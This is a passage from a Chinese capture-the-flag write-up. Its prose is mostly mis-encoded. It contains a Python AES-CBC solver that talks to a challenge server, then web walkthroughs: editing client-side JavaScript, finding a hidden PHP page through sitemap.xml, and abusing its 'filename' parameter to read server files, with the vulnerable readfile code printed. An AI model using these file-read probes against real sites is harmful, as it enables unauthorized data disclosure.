</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 44 words</span>
</span></span><span class="line"><span class="cl">    <span class="n">words</span> <span class="o">=</span> <span class="p">[</span><span class="nb">bytes</span><span class="p">(</span><span class="n">key_symbols</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">44</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">temp</span> <span class="o">=</span> <span class="n">words</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span> <span class="o">=</span> <span class="n">xor_bytes</span><span class="p">(</span><span class="n">sub_word</span><span class="p">(</span><span class="n">rot_word</span><span class="p">(</span><span class="n">temp</span><span class="p">)),</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">Rcon</span><span class="p">[</span><span class="n">i</span><span class="o">//</span><span class="mi">4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">words</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">words</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="n">temp</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">words</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">xor_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">w</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">r</span><span class="p">:</span><span class="mi">4</span><span class="o">*</span><span class="p">(</span><span class="n">r</span><span class="o">+</span><span class="mi">1</span><span class="p">)]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">Sbox</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">InvSbox</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shift_rows</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_shift_rows</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span><span class="n">s</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xtime</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">a</span><span class="o">&lt;&lt;</span><span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0x1b</span> <span class="k">if</span> <span class="n">a</span> <span class="o">&amp;</span> <span class="mh">0x80</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mul</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">^=</span> <span class="n">a</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">xtime</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mix_columns</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">col</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span><span class="p">:</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">+=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">3</span><span class="p">)</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">3</span><span class="p">)</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">3</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">3</span><span class="p">)</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">^</span> <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_mix_columns</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">col</span><span class="o">=</span><span class="n">s</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span><span class="p">:</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">+=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">14</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">11</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">13</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">9</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">9</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">14</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">11</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">13</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">13</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">9</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">14</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">11</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">11</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">13</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">9</span><span class="p">)</span><span class="o">^</span><span class="n">mul</span><span class="p">(</span><span class="n">col</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">14</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">aes_decrypt_block</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">w</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_shift_rows</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_mix_columns</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">inv_shift_rows</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------- CBC è§£å¯† ----------------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">aes_cbc_decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span> <span class="o">=</span> <span class="n">expand_key</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">prev</span> <span class="o">=</span> <span class="n">iv</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">),</span><span class="mi">16</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec</span> <span class="o">=</span> <span class="n">aes_decrypt_block</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">pt</span> <span class="o">+=</span> <span class="n">xor_bytes</span><span class="p">(</span><span class="n">dec</span><span class="p">,</span> <span class="n">prev</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">prev</span> <span class="o">=</span> <span class="n">block</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------- MAIN: è¿æ¥å¹¶è§£å¯† ----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;geek.ctfplus.cn&#34;</span><span class="p">,</span> <span class="mi">30875</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher_bytes</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;=&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;=&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] KEY1 =&#34;</span><span class="p">,</span> <span class="n">key1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">key1</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pt</span> <span class="o">=</span> <span class="n">aes_cbc_decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å» PKCS7 padding</span>
</span></span><span class="line"><span class="cl">    <span class="n">pad_len</span> <span class="o">=</span> <span class="n">pt</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt</span> <span class="o">=</span> <span class="n">pt</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] FLAG =&#34;</span><span class="p">,</span> <span class="n">pt</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœSYC{SS_B0xx_I1s_ver1y_Differe1c999c}</p>
<h1 id="web">web
</h1><h3 id="35é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ">35.é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ
</h3><p>1.ç›´æ¥ç‚¹å‡»è¿½èµ¶ï¼Œæœ€ç»ˆè¿½ä¸Šä½†å›æ˜¾æ˜¯è™šå‡çš„flag
2.å¼€å‘è€…å·¥å…·ä¿®æ”¹æºä»£ç æŠŠé˜¿åŸºé‡Œæ–¯çš„ä½ç½®æ”¹æˆ200ï¼Œä¹Œé¾Ÿä½ç½®æ”¹æˆ100.æœ¬åœ°è¦†ç›–ï¼Œåˆ·æ–°
3.å†ç‚¹è¿½èµ¶è·å–çœŸå®flagï¼šSYC{Spi1t_th3_T1me_t0_the_3nd_019aba97fc4c7c3d8d05c30b00db6f2b}</p>
<h3 id="36vibe-seo">36.Vibe SEO
</h3><p>1.å¼€å¯ç¯å¢ƒè¿›å…¥å‘ç°åªæ˜¯png.ç¬¬ä¸€æƒ³åˆ°å›¾ç‰‡éšå†™ï¼Œå°è¯•åå‘ç°å¹¶ä¸æ˜¯ï¼Œå†æ¬¡å®¡é¢˜å¹²ï¼Œå…³æ³¨é¢˜ç›®ä¸­â€œç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾â€ï¼Œç«™ç‚¹åœ°å›¾æ˜¯ç½‘ç«™å‘æœç´¢å¼•æ“æä¾›çš„ç»“æ„åŒ–é¡µé¢ç´¢å¼•æ–‡ä»¶ï¼ˆé€šå¸¸å‘½åä¸ºÂ sitemap.xmlÂ ã€Â sitemap.txtÂ ç­‰ï¼‰ã€‚
2.å°è¯•æ‹¼æ¥ç«™ç‚¹åœ°å›¾ç›¸å…³è·¯å¾„http://819a268a-232f-7e31-9016-301e2c38c692.geek.ctfplus.cn/sitemap.xmlï¼ŒæˆåŠŸ
3.ä»è¿™ä¸ªÂ sitemap.xmlÂ çš„æºç ä¸­å¯ä»¥æå–åˆ°å…³é”®è·¯å¾„http://localhost/aa__^^.phpï¼Œæ ¸å¿ƒæ€è·¯æ˜¯æ›¿æ¢è·¯å¾„ä¸­çš„localhostä¸ºé¢˜ç›®åŸŸåï¼Œè®¿é—®ç›®æ ‡æ–‡ä»¶ã€‚å°è¯•æ„é€ URLä¸ºhttp://019abae6-0385-75ee-a05e-21775d87bf24.geek.ctfplus.cn/aa__%5E%5E.php
4.ä»é¡µé¢å›æ˜¾å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªfilenameå‚æ•°ï¼Œå°è¯•æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé€šè¿‡filenameå‚æ•°ä¼ é€’æ–‡ä»¶è·¯å¾„ã€‚å°è¯•ä¸€ç³»åˆ—è¯»å–å¸¸è§çš„Flagè·¯å¾„:http://xxx.geek.ctfplus.cn/aa__^^.php?filename=flag.txtæ— æœï¼Œä½†å›æ˜¾æ˜¾ç¤ºfilename to long
5.äºæ˜¯è¯»å–å½“å‰æ–‡ä»¶çš„æºç ï¼ˆçœ‹æ˜¯å¦å†…åµŒFlagï¼‰ï¼šhttp://019a268a-232f-7e31-9016-301e2c38c692.geek.ctfplus.cn/aa__^^.php?filename=aa__^^.phpã€‚å¦‚ä¸‹</p>
<?php
$flag = fopen('/my_secret.txt', 'r');
if (strlen($_GET['filename']) < 11) {
  readfile($_GET['filename']);
} else {
  echo "Filename too long";
}
å‡ºç°flagä½ç½®æç¤ºï¼Œæ˜ç¡®Flagå­˜å‚¨åœ¨æœåŠ¡å™¨æ ¹ç›®å½•çš„Â /my_secret.txtÂ æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªé™åˆ¶æ¡ä»¶ï¼Œåªæœ‰å½“Â filenameÂ å‚æ•°çš„é•¿åº¦å°äº11æ—¶ï¼Œæ‰èƒ½é€šè¿‡Â readfile()Â è¯»å–æ–‡ä»¶å†…å®¹ã€‚
ä½†/my_secret.txtÂ é•¿åº¦å…±14ä¸ªå­—ç¬¦ï¼Œå°è¯•ç”¨çŸ­è·¯å¾„/ç¼©å†™/é€šé…ç¬¦ä¼˜åŒ–ï¼Œæ— æœ
